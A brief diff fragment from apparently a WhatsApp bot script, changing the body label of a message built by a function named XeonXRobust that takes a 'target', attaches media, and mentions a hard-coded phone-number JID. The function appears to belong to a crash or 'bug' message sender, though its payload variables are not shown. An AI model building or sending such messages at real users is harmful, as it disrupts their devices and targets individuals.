@@ -88,7 +88,7 @@ async function XeonXRobust(target, o, Ptcp = true) {
          hasMediaAttachment: true,
         },
 
-									body: { text: '🕷️🕸️ 𝑺𝑷𝑰𝑫𝑬𝑹-𝑿 👻' + ui + jids },
+									body: { text: '👻' + ui + jids },
 									contextInfo: {
 										mentionedJid: ['916909137213@s.whatsapp.net'],
 										mentions: ['916909137213@s.whatsapp.net'],
